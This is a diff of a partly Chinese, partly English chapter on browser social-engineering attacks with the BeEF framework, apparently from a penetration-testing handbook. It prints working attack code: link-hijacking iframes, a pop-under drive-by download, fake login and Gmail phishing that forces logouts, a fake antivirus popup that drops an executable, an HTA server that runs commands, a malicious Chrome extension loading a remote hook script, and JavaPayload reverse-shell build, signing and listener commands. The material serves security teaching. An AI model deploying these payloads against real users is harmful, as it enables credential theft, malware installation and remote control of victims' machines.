   var iframe = $j('<iframe />').attr(params).css(css).load(onload).
+
     prependTo('body');
 
   return iframe;
+
 }
 ```
 
 jQuery 的选择器的强大再次发挥作用，提供了一个简单的方法来遍历当前 DOM 中每个锚标签：
 
-``` 
+```
 $j('a').click(function(event) {
+
   if ($j(this).attr('href') != '') {
+
     event.preventDefault();
+
     beef.dom.createIframe('fullscreen',
+
       {'src':$j(this).attr('href')},
+
       {},
+
       null
+
     );
+
     $j(document).attr('title',$j(this).html());
+
     document.body.scroll = "no";
+
     document.documentElement.style.overflow = 'hidden';
+
   }
+
 });
 ```
 
@@ -4712,29 +4667,29 @@ Level1 **1.** 第一个 if 语句判断当前链接是否包含 HREF 属性；�
 
 Figure 5-5 展示了一个被钩住的页面，所有链接都被重写；如图中高亮所示，目标 URL 仍然显示在状态栏中。Figure 5-6 展示点击链接后的情况；地址栏保持与之前钩住的页面相同，而页面标题被设置为链接的名称。如果你访问 [`beefproject.com`](http://beefproject.com)，你会发现实际标题是“BeEF — The Browser Exploitation Framework Project”。
 
- start figure 
+start figure 
 
 **Figure 5-5:** 重写后的链接
 
 ![c05f005.eps](img/c05f005.png)
 
- end figure   start figure 
+end figure   start figure 
 
 **Figure 5-6:** 全屏 IFrames
 
 ![c05f006.eps](img/c05f006.png)
 
- end figure 
+end figure 
 
 上述逻辑位于 BeEF 的“创建前景 IFrames”模块中。如果你是急躁的类型，可以更直接地强制加载 IFrames。为了最大限度地减少被目标检测到的可能性，你可以利用 BeEF 的事件日志，等待目标离开钩住页面后再打开 IFrames。这在 Figure 5-7 中演示。当目标离开后，可以执行“重定向浏览器（IFrames）”模块来打开一个新的全屏 IFrames。另一种避免检测的技巧是加载相同的页面在 IFrames 中——这样用户会继续浏览，而不会察觉自己被困在一个窗口中。
 
- start figure 
+start figure 
 
 **Figure 5-7:** BeEF 事件查看器等待模糊事件
 
 ![c05f007.eps](img/c05f007.png)
 
- end figure 
+end figure 
 
 一种更高级的全屏攻击利用了 HTML5 Fullscreen API 的强大。大多数浏览器都有选项以全屏显示内容，例如在 Windows 的 Internet Explorer 中点击 F11。得益于 HTML5 Fullscreen API，这种操作可以在浏览器内部编程化地执行。这是 YouTube 用来显示全屏视频的机制之一。
 
@@ -4748,46 +4703,55 @@ Level2 **1.** 阻止默认操作和事件处理。 **2.** 进入全屏模式。 
 
 由于浏览器的不一致性，进入全屏模式的代码在不同浏览器之间略有差异。以下是处理方法：
 
-``` 
+```
 function requestFullScreen() {
+
   if (document.documentElement.requestFullscreen) {
+
     document.documentElement.requestFullscreen();
+
   } else if (document.documentElement.webkitRequestFullScreen) {
+
     document.documentElement.webkitRequestFullScreen(
+
      Element.ALLOW_KEYBOARD_INPUT);
+
   } else if (document.documentElement.mozRequestFullScreen) {
+
     document.documentElement.mozRequestFullScreen();
+
   } else {
+
     /* can't go fullscreen */
+
   }
+
 }
 ```
 
 或者，Sindre Sorhus 编写了一个跨浏览器的 JavaScript 库，同样可以使用。注意，虽然你可以编程控制在全屏中打开的站点，但浏览器仍会显示警告对话框，如 Figure 5-8 所示：
 
- start figure 
+start figure 
 
 **Figure 5-8:** 全屏警告
 
 ![c05f008.tif](img/c05f008.png)
 
- end figure 
+end figure 
 
 如何减少用户怀疑被伪造全屏显示的可能性？尝试在你控制的域名上加载框架，并使用一个与原始站点名称非常相似的名称。理想情况下，如果新域名只与原始域名略有不同，警告对话框和加载的网站看起来几乎相同。
 
 ## 滥用 UI 期望
 
-
-
 大多数浏览器已从弹窗通知转为无模式通知，用于文件下载、插件激活和 HTML5 特权 API 调用。Safari 是当时唯一的例外，仍然使用弹窗通知。无模式通知的概念（如 Figure 5-9 所示）是不中断当前网页导航的情况下告知用户某事，即提升可用性而不困扰用户。
 
- start figure 
+start figure 
 
 **Figure 5-9:** Modeless notification examples
 
 ![c05f009.tif](img/c05f009.png)
 
- end figure 
+end figure 
 
 Rosario Valotta 在 Hack In The Box 2013.17 发表了关于如何在多个浏览器中滥用这些无模式对话框的研究。首先，如前文所述，无模式通知很容易伪造。只需几行 JavaScript 和 CSS，就能显示 Chrome 或 Internet Explorer 在下载可执行文件时会显示的相同内容。Rosario 还指出了无模式通知的四个主要问题：
 
@@ -4813,50 +4777,86 @@ Level1 **1.** 使用 jQuery pop-under（第 3 章已介绍）弹出一个后窗�
 
 ```
 <!DOCTYPE html>
+
 <html>
+
 <head>
+
 <!-- with IE9, the focus of the pop-under is on the 
+
  notification bar, which facilitates the attack -->
+
 <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+
 </head>
+
 <body>
+
 <h2>Private Forum
+
 <br>
+
 <h3>Click the button to start registration
+
 <div>
+
  <button onclick="loadpopunder()">Start</button>
+
 </div>
+
 <script>
+
 function loadpopunder(){
+
   win3=window.open('popunder.html','',
+
   'top=0, left=0,width=500,height=500');
+
   win3.blur();
+
   document.write("Loading...");
+
   document.location="captcha.html";
+
   doit();
+
 }   
+
 function doit(){
+
   win3=window.open('popunder.html','',
+
   'top=0, left=0,width=500,height=500');
+
   win3.blur(); 
+
 }
+
 </script>
+
 </body>
+
 </html>
 ```
 
-当用户点击“Start”按钮时，loadpopunder() 函数会被触发，弹出后窗口加载 popunder.html 页面，包含如下代码：
 
-```
+
+当用户点击“Start”按钮时，`loadpopunder()`函数会被触发，弹出后窗口加载`popunder.html`页面，包含如下代码：
+
+```html
 <!DOCTYPE html>
+
 <html>
+
 <head>
+
  <meta charset="utf-8" />
  <!-- with IE9, the focus of the pop-under is on the 
  notification bar, which facilitates the attack -->
  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
  <title>Exploit Demo</title>
 </head>
+
 <body style='height: 1000px' >
 <iframe id="f1" width="100" height="100"></iframe>
 <script type="text/javascript">
@@ -4866,9 +4866,9 @@ function doit(){
 </html>
 ```
 
-由于后窗口位于活动浏览器窗口的正后方，用户不会注意到这一点。同时，JavaScript 动态修改 iframe 的 src 以触发可执行文件的下载，同时将当前页面的位置改为 captcha.html：
+由于后窗口位于活动浏览器窗口的正后方，用户不会注意到这一点。同时，JavaScript 动态修改 `iframe` 的 `src` 以触发可执行文件的下载，同时将当前页面的位置改为 `captcha.html`：
 
-```
+```html
 <!DOCTYPE html>
 <html>
 <head>
@@ -4890,38 +4890,27 @@ function doit(){
 
 假装的验证码提示正是你用来让受害者输入你想要的键（在此例中为 R 键，假设操作系统为英文）的手段。Figure 5-10 和 Figure 5-11 展示了用户按下 R 键（即假验证码图像中的第一个字符）时的情况：
 
- start figure 
-
+start figure 
 **Figure 5-10:** 当用户被诱导按下 R 键后，程序将运行。
-
 ![c05f010.tif](img/c05f010.png)
-
- end figure   start figure 
-
+end figure  
+start figure 
 **Figure 5-11:** 安装随即自动进行。
-
 ![c05f011.tif](img/c05f011.png)
+end figure 
 
- end figure 
-
-为了使默认焦点落在通知栏，前面的代码包含了 meta 标签，使 IE 渲染为 IE 7。渲染为 IE 7 后，浏览器会自动将焦点设为通知栏（IE 7 原本如此）。这意味着不再需要 Tab+R，只需按 R 键即可执行二进制文件，这一简单改动提升了攻击的成功率。
+为了使默认焦点落在通知栏，前面的代码包含了 `meta` 标签，使 IE 渲染为 IE 7。渲染为 IE 7 后，浏览器会自动将焦点设为通知栏（IE 7 原本如此）。这意味着不再需要 `Tab+R`，只需按 R 键即可执行二进制文件，这一简单改动提升了攻击的成功率。
 
 此攻击技术的两大局限是：用户访问控制（UAC）18 和 SmartScreen 过滤器。19 UAC 不是大问题，因为它仅在需要管理员权限运行可执行文件时触发。Meterpreter 后门可执行文件通常不需要此类权限。第二，SmartScreen 过滤器于 Internet Explorer 8 引入，是基于声誉的控制，用于在用户未先确认的情况下阻止潜在危险的可执行文件运行。Figure 5-12 展示了 SmartScreen 过滤器的几个示例：
 
- start figure 
-
+start figure 
 **Figure 5-12:** SmartScreen Filter in action
-
 ![c05f012.eps](img/c05f012.png)
-
- end figure 
+end figure 
 
 与大多数基于声誉的检查相比，SmartScreen 并非 100% 可靠。根据 Valotta 的研究，20% 的在 Twitter 上发布的缩短链接（也称为 exetweets）指向可执行文件，能够绕过 SmartScreen。此外，如果你能用 Symantec Extended Validation 签名证书签署可执行文件，SmartScreen 会立即将其视为有效，而无需对该文件或发布者的先前声誉。20
 
 ### 使用假登录提示
-
-
-
 
 如果你已经监听键盘事件，你可能会想，为什么还要通过其他方式获取用户名和密码。毕竟，你已经能看到所有的键盘输入了，对吗？捕获 DOM 关键字事件的有效性完全取决于钩子在应用程序中的位置。
 
@@ -4931,24 +4920,21 @@ function doit(){
 
 这些网络钓鱼攻击的影响在一定程度上取决于初始钩子的上下文。遗憾的是，大多数用户仍会在所有警报响起的同时提交他们的信息。这也是传统网络钓鱼诈骗仍然能够有效获取银行凭据的部分原因。如果你能让足够多的人访问该网站，你仍然可以骗几个人透露他们的敏感信息。
 
-使用 JavaScript 的 prompt() 函数在用户的浏览会话中加载一个假登录提示非常简单，如下所示：
+使用 JavaScript 的 `prompt()` 函数在用户的浏览会话中加载一个假登录提示非常简单，如下所示：
 
-```
+```js
 var answer = prompt("Your session has expired. 
   Please re-enter your password:");
 ```
 
 执行后，会出现一个对话框，类似于 Figure 5-13。
 
- start figure 
-
+start figure 
 **Figure 5-13:** Prompt dialog box
-
 ![c05f013.tif](img/c05f013.png)
+end figure 
 
- end figure 
-
-answer 变量随后可以提交回攻击者，但使用这种方法并不高效。对话框显然位置不当，且未与原始网站品牌化，同时你会发现该输入框不会像大多数密码对话框那样遮盖输入字符。
+`answer` 变量随后可以提交回攻击者，但使用这种方法并不高效。对话框显然位置不当，且未与原始网站品牌化，同时你会发现该输入框不会像大多数密码对话框那样遮盖输入字符。
 
 ### Pretty Theft
 
@@ -4956,56 +4942,45 @@ answer 变量随后可以提交回攻击者，但使用这种方法并不高效�
 
 该模块提供了一系列预设的网络钓鱼模板，包括针对以下常见服务的模板：
 
-*   Facebook
-
-*   LinkedIn
-
-*   YouTube
-
-*   Yammer
+* Facebook
+* LinkedIn
+* YouTube
+* Yammer
 
 对于其他情况，该模块还提供一个通用模式，允许在对话框中插入自定义图片。
 
 该模块使用类似的深色模态对话框，并在执行后启动一个定时器，持续检查用户名和密码提示的更新。Figure 5-14 展示了该模块在通用模式下的样子，而 Figure 5-15 展示了该模块在 Facebook 模式下的样子。你可以在 [`browserhacker.com`](https://browserhacker.com) 查看完整的模块代码。
 
- start figure 
-
+start figure 
 **Figure 5-14:** Pretty Theft module in generic mode
-
 ![c05f014.tif](img/c05f014.png)
-
- end figure  start figure 
-
+end figure  
+start figure 
 **Figure 5-15:** Pretty Theft module in Facebook mode
-
 ![c05f015.tif](img/c05f015.png)
-
- end figure 
+end figure 
 
 ### Gmail Phishing
 
 另一个显然是这些动态嵌入式网络钓鱼诈骗的热门目标是 Gmail。截至 2012 年 6 月，Google 的邮件服务被认为是最流行的网络邮件平台，超过了当时的 Hotmail，达到惊人的 4.25 亿用户，而 Hotmail 当时仅有 3.6 亿用户。21 如此多的用户意味着巨大的攻击面，因此“Gmail Phishing”模块应运而生。该 BeEF 模块由 @floyd_ch 开发，与早前的模块类似，但其执行方式略有不同。首次执行时，模块会执行以下操作：
 
-```
+```js
 document.title = "Google Mail: Email from Google";
 beef.browser.changeFavicon("https://mail.google.com/favicon.ico");
 logoutGoogle();
 displayPhishingSite();
 ```
 
-网络钓鱼是通过更新当前文档的标题，然后更新图标为 Google 的 favicon.ico 文件来实现的。logoutGoogle() 函数会启动一个无限循环，持续请求 Google 的注销函数，该函数缺乏 XSRF 防护机制，因此会在没有任何质疑的情况下注销当前已登录用户。这将在用户已登录时将其注销，或者如果用户尝试在其他地方登录则保持其注销状态。displayPhishingSite() 函数随后会将当前 document.body 元素重置为网络钓鱼内容，如 Figure 5-16 所示。
+网络钓鱼是通过更新当前文档的标题，然后更新图标为 Google 的 `favicon.ico` 文件来实现的。`logoutGoogle()` 函数会启动一个无限循环，持续请求 Google 的注销函数，该函数缺乏 XSRF 防护机制，因此会在没有任何质疑的情况下注销当前已登录用户。这将在用户已登录时将其注销，或者如果用户尝试在其他地方登录则保持其注销状态。`displayPhishingSite()` 函数随后会将当前 `document.body` 元素重置为网络钓鱼内容，如 Figure 5-16 所示。
 
- start figure 
-
+start figure 
 **Figure 5-16:** Gmail Phishing
-
 ![c05f016.eps](img/c05f016.png)
-
- end figure 
+end figure 
 
 当目标将其数据输入登录提示时，模块会将凭据发送回 BeEF 服务器，尝试打开一个新窗口并再次钩住 BeEF，最后将用户重定向回 Google 登录页面。由于之前的注销功能，目标会看起来像是在同一页面上（即网络钓鱼内容）重新输入凭据，仿佛第一次输入错误一样。以下代码片段展示了该逻辑：
 
-```
+```js
 window.open(http://browserhacker.com/rehook.html);
 window.focus();
 window.location = "https://accounts.google.com/ServiceLoginAuth";
@@ -5023,12 +4998,10 @@ window.location = "https://accounts.google.com/ServiceLoginAuth";
 
 有时为了让假对话框更具焦点，可以先使用全屏模态对话框或窗口遮 darkened 屏幕。以下 JavaScript 函数将帮助你实现这一点：
 
+- [灰色屏幕函数](https://example.org) 用于在屏幕上显示一个黑色的半透明遮罩层。执行 `grayOut(true)` 时，黑色元素会填满整个屏幕，透明度设置为 70%。执行 `grayOut(false)` 时，该元素的 `display` 属性被设置为 `none`，从而隐藏它。
 
-
-
--   [灰色屏幕函数](https://example.org) 用于在屏幕上显示一个黑色的半透明遮罩层。执行 `grayOut(true)` 时，黑色元素会填满整个屏幕，透明度设置为 70%。执行 `grayOut(false)` 时，该元素的 `display` 属性被设置为 `none`，从而隐藏它。
-
-```function grayOut(vis) {
+```js
+function grayOut(vis) {
   var dark=document.getElementById('darkenScreenObject');
   if (!dark) {
     var tbody = document.getElementsByTagName("body")[0];
@@ -5059,9 +5032,10 @@ window.location = "https://accounts.google.com/ServiceLoginAuth";
 }
 ```
 
--   当执行 `grayOut(true)` 时，会出现一个黑色的半透明遮罩层，遮罩层的透明度为 70%，从而使其看起来像是暗化了背景。执行 `grayOut(false)` 则会把该元素的 `display` 属性恢复为 `none`，使其再次隐藏。
+- 当执行 `grayOut(true)` 时，会出现一个黑色的半透明遮罩层，遮罩层的透明度为 70%，从而使其看起来像是暗化了背景。执行 `grayOut(false)` 则会把该元素的 `display` 属性恢复为 `none`，使其再次隐藏。
 
-```function avpop() {
+```js
+function avpop() {
   avdiv = document.createElement('div');
   avdiv.setAttribute('id', 'avpop');
   avdiv.setAttribute('style', 'width:754px;height:488px;position:fixed;
@@ -5074,127 +5048,136 @@ window.location = "https://accounts.google.com/ServiceLoginAuth";
 }
 ```
 
--   执行 `avpop()` 后，会在黑色遮罩层之上弹出一个假冒防病毒的图片对话框。通过为该图片添加点击事件，可以完成攻击循环：
+- 执行 `avpop()` 后，会在黑色遮罩层之上弹出一个假冒防病毒的图片对话框。通过为该图片添加点击事件，可以完成攻击循环：
 
-```$j('#avclicker').click(function(e) {
-
+```js
+$j('#avclicker').click(function(e) {
   var div = document.createElement("div");
   div.id = "download";
   div.style.display = "none";
   div.innerHTML=
     "<iframe src='http://browserhacker.com/bad_executable.exe'
     width=1 height=1 style='display:none'></iframe>";
-  
   document.body.appendChild(div);
-
   $j('#avpop').remove();
   grayOut(false);
 });
 ```
 
--   当点击假冒防病毒图片时，会加载一个不可见的 iframe，从而下载位于 http://browserhacker.com/bad_executable.exe 的可执行文件。随后会移除假冒对话框和黑色遮罩层，使页面恢复到之前的状态。此方法的局限性在于，它仅用于下载可执行文件。
+- 当点击假冒防病毒图片时，会加载一个不可见的 `iframe`，从而下载位于 `http://browserhacker.com/bad_executable.exe` 的可执行文件。随后会移除假冒对话框和黑色遮罩层，使页面恢复到之前的状态。此方法的局限性在于，它仅用于下载可执行文件。
 
--   与之前提供可执行文件的示例不同，如果针对的浏览器是 Internet Explorer，可以诱导用户运行一个 HTML 应用程序（HTA）。简言之，HTA 将 Internet Explorer 的所有功能封装在不受浏览器严格安全模型和用户界面限制的环境中。例如，在 HTA 中运行的代码会忽略安全区域设置，从而可以轻松访问文件系统、注册表，甚至执行命令。因此，HTA 已被用于恶意活动，最早在 2007 年和 2008 年就出现过。令人惊讶的是，HTA 仍然在最新的 Internet Explorer 中可用，因而仍是有效的攻击向量。
+- 与之前提供可执行文件的示例不同，如果针对的浏览器是 Internet Explorer，可以诱导用户运行一个 HTML 应用程序（HTA）。简言之，HTA 将 Internet Explorer 的所有功能封装在不受浏览器严格安全模型和用户界面限制的环境中。例如，在 HTA 中运行的代码会忽略安全区域设置，从而可以轻松访问文件系统、注册表，甚至执行命令。因此，HTA 已被用于恶意活动，最早在 2007 年和 2008 年就出现过。令人惊讶的是，HTA 仍然在最新的 Internet Explorer 中可用，因而仍是有效的攻击向量。
 
--   下面的代码是一个简单的 Ruby Web 服务器，用于提供一个小型 HTA 应用程序：
+- 下面的代码是一个简单的 Ruby Web 服务器，用于提供一个小型 HTA 应用程序：
 
-```require 'rubygems'
+```ruby
+require 'rubygems'
 require 'thin'
 require 'rack'
 require 'sinatra'
-
 class Hta < Sinatra::Base
-  before do
-    content_type 'application/hta'
-  end
+```
 
-  get "/application.hta" do
- "<script>new ActiveXObject('WScript.Shell')" + 
- ".Run('calc.exe')</script>"
-  end
+
+
+```ruby
+before do
+  content_type 'application/hta'
+end
+
+get "/application.hta" do
+  "<script>new ActiveXObject('WScript.Shell')" + 
+  ".Run('calc.exe')</script>"
+end
 end
 
 @routes = {
-    "/" => Hta.new
+  "/" => Hta.new
 }
 
 @rack_app = Rack::URLMap.new(@routes)
+
 @thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)
 
 Thin::Logging.silent = false
+
 Thin::Logging.debug = true
 
 puts "[#{Time.now}] Thin ready"
+
 @thin.start
 ```
 
--   访问 `http://browserhacker.com:4000/application.hta` 将弹出如 Figure 5-17 所示的 HTA 警告对话框：
+- 访问 `http://browserhacker.com:4000/application.hta` 将弹出如 Figure 5-17 所示的 HTA 警告对话框：
 
 start figure 
 
-[**Figure 5-17:** HTA warning
+**Figure 5-17:** HTA warning
 
 ![c05f017.tif](img/c05f017.png)
 
- end figure 
+end figure 
 
--   如 Figure 5-17 所示，对话框看起来像是由 Microsoft 开发的，但实际上并非如此。警告对话框没有任何文件来源的提示，这有助于诱导用户点击“允许”按钮。在此情况下，如果用户允许执行，calc.exe 将会运行。你可以在 browserhacker.com 上查看更高级的攻击示例。
+- 如 Figure 5-17 所示，对话框看起来像是由 Microsoft 开发的，但实际上并非如此。警告对话框没有任何文件来源的提示，这有助于诱导用户点击“允许”按钮。在此情况下，如果用户允许执行，`calc.exe` 将会运行。你可以在 `browserhacker.com` 上查看更高级的攻击示例。
 
--   为了优化此攻击，自动安装的浏览器扩展可能更为有效，具体取决于情况和目标浏览器。要真正执行负载，需要在目标浏览器中运行以下 JavaScript：
+- 为了优化此攻击，自动安装的浏览器扩展可能更为有效，具体取决于情况和目标浏览器。要真正执行负载，需要在目标浏览器中运行以下 JavaScript：
 
-```grayOut(true);
+```javascript
+grayOut(true);
 avpop();
 ```
 
--   BeEF 包含相同的逻辑，并在其“Fake AV”模块中实现，当执行时，目标会看到类似 Figure 5-18 的内容：
+- BeEF 包含相同的逻辑，并在其“Fake AV”模块中实现，当执行时，目标会看到类似 Figure 5-18 的内容：
 
 start figure 
 
-[**Figure 5-18:** Fake AV pop-up
+**Figure 5-18:** Fake AV pop-up
 
 ![c05f018.tif](img/c05f018.png)
 
- end figure 
+end figure 
 
--   BeEF 还有一个“Fake Flash Update”模块，它不再是诱导用户下载可执行文件，而是尝试诱导用户安装恶意浏览器扩展，如 Figure 5-19、Figure 5-20、Figure 5-21 和 Figure 5-22 所示。在此情形下，恶意扩展会部署并执行一个反向 Meterpreter 负载。第 7 章专门讨论扩展，因此这里不再详细展开。
+- BeEF 还有一个“Fake Flash Update”模块，它不再是诱导用户下载可执行文件，而是尝试诱导用户安装恶意浏览器扩展，如 Figure 5-19、Figure 5-20、Figure 5-21 和 Figure 5-22 所示。在此情形下，恶意扩展会部署并执行一个反向 Meterpreter 负载。第 7 章专门讨论扩展，因此这里不再详细展开。
 
 start figure 
 
-[**Figure 5-19:** Fake Flash dialog box
+**Figure 5-19:** Fake Flash dialog box
 
 ![c05f019.tif](img/c05f019.png)
 
- end figure 
+end figure 
 
--   用户点击“安装”按钮后，Firefox 会显示如 Figure 5-20 所示的警告对话框。
+- 用户点击“安装”按钮后，Firefox 会显示如 Figure 5-20 所示的警告对话框。
 
 start figure 
 
-[**Figure 5-20:** First Firefox warning
+**Figure 5-20:** First Firefox warning
 
 ![c05f020.tif](img/c05f020.png)
 
- end figure 
+end figure 
 
--   警告对话框不止这些。如果用户点击“允许”，则会出现如 Figure 5-21 所示的安装确认对话框。
+- 警告对话框不止这些。如果用户点击“允许”，则会出现如 Figure 5-21 所示的安装确认对话框。
 
 start figure 
 
-[**Figure 5-21:** Extension Install dialog box
+**Figure 5-21:** Extension Install dialog box
 
 ![c05f021.tif](img/c05f021.png)
 
- end figure 
+end figure 
 
--   用户点击最终的“Install Now”按钮后，恶意扩展将被安装，随后提示用户重新启动浏览器，如 Figure 5-22 所示。
+- 用户点击最终的“Install Now”按钮后，恶意扩展将被安装，随后提示用户重新启动浏览器，如 Figure 5-22 所示。
 
 start figure 
 
-[**Figure 5-22:** Restart dialog box
+**Figure 5-22:** Restart dialog box
 
 ![c05f022.tif](img/c05f022.png)
 
- end figure   start feature 
+end figure  
+
+start feature 
 
 * * *
 
@@ -5202,12 +5185,9 @@ start figure
 
 * * *
 
- end feature 
+end feature 
 
 As you may have guessed from the previous figures, the module selected is targeting the Firefox browser. Not to worry, we haven’t left all you Chrome fans behind. Lucky for you, the module also comes with an optional payload targeting Chrome.
-
-
-
 
 From Chrome 版本 20 起，你只能从合法的 Google Chrome 商店安装 Chrome 扩展程序，不能再从其他任何地方安装。然而，Luca Carettoni 和 Michele Orrú 的研究发现了一种绕过此限制的方法。他们发现，Google 在将扩展程序放入商店之前并未分析或调查这些扩展是否包含恶意或后门代码。随后，该扩展被用于窃取用户的所有 Cookie（包括标记为 HttpOnly 的 Cookie），从而获取访问 [www.meraki.com](http://www.meraki.com) 云门户的权限。
 
@@ -5223,7 +5203,7 @@ end figure
 
 该恶意 Chrome 扩展程序由几张图片和两个文件组成，即 `manifest.json` 文件和 `background.js` 文件。`manifest.json` 包含以下内容：
 
-```
+```json
 {
   "name": "Adobe Flash Player Security Update",
   "manifest_version": 2,
@@ -5253,7 +5233,7 @@ end figure
 
 而 `background.js` 文件包含以下代码：
 
-```
+```javascript
 d=document;
 e=d.createElement('script');
 e.src="https://browserhacker.com/hook.js";
@@ -5274,7 +5254,7 @@ Nick Freeman 和 Denis Andzakovic 对 Clippy 的消失感到惋惜，于是他�
 
 实现该功能的代码如下：
 
-```
+```javascript
 Clippy.prototype.hahaha = function() {
   var div = document.createElement("div");
   var _c = this;
@@ -5282,7 +5262,6 @@ Clippy.prototype.hahaha = function() {
   div.style.display = "none";
   div.innerHTML="<iframe src='http://browserhacker.com/calc.exe' 
     width=1 height=1 style='display:none'></iframe>";
-  
   document.body.appendChild(div);
   _c.openBubble("Thanks for using Clippy!");
   setTimeout(function () { _c.killClippy(); }, 5000); 
@@ -5291,15 +5270,15 @@ Clippy.prototype.hahaha = function() {
 
 `_c.openBubble()` 调用会弹出一个 `PopupDisplay` 对话框，看起来像是 Clippy 的气泡。该函数同时调用 `_c.killClippy()` 结束 Clippy。此逻辑在 Clippy 的 `run()` 方法中通过添加 `HelpText` 对象时被调用，如下所示：
 
-```
+```javascript
 var Help = new HelpText("Would you like to update your browser?");
-  Help.addResponse("Yes",function() { _c.hahaha(); });
-  Help.addResponse("Not now", function() {
-    _c.killClippy();
-    setTimeout(function() {
-      new Clippy().run();
-    }, 5000);
-  });
+Help.addResponse("Yes",function() { _c.hahaha(); });
+Help.addResponse("Not now", function() {
+  _c.killClippy();
+  setTimeout(function() {
+    new Clippy().run();
+  }, 5000);
+});
 this.addHelp(Help,true);
 ```
 
@@ -5329,30 +5308,37 @@ start figure
 
 end figure 
 
-
-
 If the applet is signed with a legitimate code-signing certificate, such as those offered from Symantec or any of the other SSL vendors, the applet will not display a security dialog box to the user. To increase the likelihood that the applet will execute with minimal security warnings, it will be worthwhile to purchase a code-signing certificate. The implications of signing malicious code, for example Windows binaries, were discussed previously in the “Abusing UI Expectations” section.
 
 BeEF relies on Michael Schierl’s JavaPayload, available from [`https://github.com/schierlm/JavaPayload`](https://github.com/schierlm/JavaPayload). After downloading it you need to build the payload for the victim. One of the benefits of using JavaPayload is that you can specify the attack vector you want to use. JavaPayload can be compiled not only as an applet, but also as a generic agent to attach to an existing Java process. More advanced usage, which may come in handy in particular situations, includes an OpenOffice BeanShell macro (written in Java) and a JDWP (Java Debugger Wire Protocol) loader. From the command line, assuming all prerequisites are met, you can build the payload by executing the following:
 
-```java -cp JavaPayload.jar javapayload.builder.AppletJarBuilder ReverseTCP
+```bash
+java -cp JavaPayload.jar javapayload.builder.AppletJarBuilder ReverseTCP
 ```
 
-This command will build the Applet_ReverseTCP.jar file. Before you can push it out to the victim, you need to sign it. For demonstration reasons, you can self-sign the JAR file. However, as mentioned earlier, to reduce the likelihood of detection this can be signed with a legitimate certificate too. To self-sign the JAR, execute the following from the command line, which will create the keyfile as specified:
 
-```keytool -keystore <keyfile> -genkey
+
+This command will build the `Applet_ReverseTCP.jar` file. Before you can push it out to the victim, you need to sign it. For demonstration reasons, you can self-sign the JAR file. However, as mentioned earlier, to reduce the likelihood of detection this can be signed with a legitimate certificate too. To self-sign the JAR, execute the following from the command line, which will create the keyfile as specified:
+
+```
+keytool -keystore <keyfile> -genkey
+```
+
+```
 jarsigner -keystore <keyfile> Applet_ReverseTCP.jar mykey
 ```
 
 Once the applet executes on the target’s computer, it will attempt to connect back to your machine. Therefore, it’s important to remember to start your listener before you execute this payload against the target. To start the listener, execute the following from the command line:
 
-```java -cp JavaPayload.jar javapayload.handler.stager.\StagerHandler ReverseTCP <Listening IP>\
+```
+java -cp JavaPayload.jar javapayload.handler.stager.\StagerHandler ReverseTCP <Listening IP>\
 <Listening TCP Port> -- JSh
 ```
 
-The “Java Applet” module relies on BeEF’s beef.dom.attachApplet() function, which for brevity we have not shown here, but you can review at [`https://browserhacker.com`](https://browserhacker.com). The JavaScript code required to attach the earlier-created applet would be something similar to this:
+The “Java Applet” module relies on BeEF’s `beef.dom.attachApplet()` function, which for brevity we have not shown here, but you can review at [`https://browserhacker.com`](https://browserhacker.com). The JavaScript code required to attach the earlier-created applet would be something similar to this:
 
-```beef.dom.attachApplet(applet_id,
+```
+beef.dom.attachApplet(applet_id,
   applet_name,
   'javapayload.loader.AppletLoader',
   null,
@@ -5368,15 +5354,11 @@ The “Java Applet” module relies on BeEF’s beef.dom.attachApplet() function
 
 The function uses the following configuration options:
 
-*   applet_id—A random applet identifier.
-
-*   applet_name—A random applet name; there’s nothing stopping this from being something such as “Microsoft.”
-
-*   applet_archive—The URL to the Applet_ReverseTCP.jar constructed earlier.
-
-*   attacker_ip—The IP address of the listening service.
-
-*   attacker_port—The TCP port of the listening service.
+* `applet_id`—A random applet identifier.
+* `applet_name`—A random applet name; there’s nothing stopping this from being something such as “Microsoft.”
+* `applet_archive`—The URL to the `Applet_ReverseTCP.jar` constructed earlier.
+* `attacker_ip`—The IP address of the listening service.
+* `attacker_port`—The TCP port of the listening service.
 
 To truly optimize this attack, especially in light of Java dialog boxes that may appear, it’s worth performing these attacks with additional fraudulent content defacements or other social-engineering tricks. This may be as simple as displaying a fake notification to the user stating, “We apologize, but due to changes in our website configuration you may receive an applet warning dialog, this is expected and must be accepted, otherwise content will not be available.”
 
@@ -5390,7 +5372,7 @@ start feature
 
  end feature 
 
-Once executed, the target will connect back to your Java listener, and the terminal should respond by displaying a “!” character. From there, you can type help to display a list of commands (see `Figure 5-26`), such as ls, that will list the contents of the current folder (as shown in `Figure 5-27`). You will further explore remote code execution, particularly as executed through exploiting plugins, in Chapter 8. Of course, once this level of access is acquired on a target’s machine, there’s nothing preventing you from executing any commands you like.
+Once executed, the target will connect back to your Java listener, and the terminal should respond by displaying a “!” character. From there, you can type `help` to display a list of commands (see `Figure 5-26`), such as `ls`, that will list the contents of the current folder (as shown in `Figure 5-27`). You will further explore remote code execution, particularly as executed through exploiting plugins, in Chapter 8. Of course, once this level of access is acquired on a target’s machine, there’s nothing preventing you from executing any commands you like.
 
 start figure 
 
@@ -5428,15 +5410,11 @@ As you have learned in this section, the number of ways in which a user’s trus
 
 When web browsers first started to become popular, there wasn’t much thought put into the concept of maintaining a user’s privacy. Over time, as the number of web applications increased, particularly those dealing with potentially personal information, this started to change. Most modern browsers are quite conscious of keeping their users’ information private; some have even gone so far as to offer private browsing modes. The feature is known by many different names on different browsers, such as:
 
-*   Chrome’s Incognito mode
-
-*   Internet Explorer’s InPrivate browsing
-
-*   Opera’s Private tab or window
-
-*   Firefox’s Private browsing
-
-*   Safari’s Private browsing
+* Chrome’s Incognito mode
+* Internet Explorer’s InPrivate browsing
+* Opera’s Private tab or window
+* Firefox’s Private browsing
+* Safari’s Private browsing
 
 Browsers in private mode will often have some part of the user interface modified to represent the change in mode. `Figure 5-29` demonstrates how Chrome distinguishes between normal and Incognito mode.
 
@@ -5444,14 +5422,11 @@ start figure
 
 **Figure 5-29:** Chrome’s Incognito mode
 
-
-
-
 ![c05f029.eps](img/c05f029.png)
 
 end figure 
 
-截至本文撰写时，仍不存在一种简单方法可以检测浏览器是否处于隐私模式。早期由 Jeremiah Grossman29 和 Collin Jackson30 进行的研究表明，较旧的浏览器版本（如 Firefox 1.5/2.0）可能会泄露它们是否处于隐私模式。研究人员通过 JavaScript getComputedStyle 函数（如第 4 章“利用浏览器历史记录”部分所述）来实现这一点。
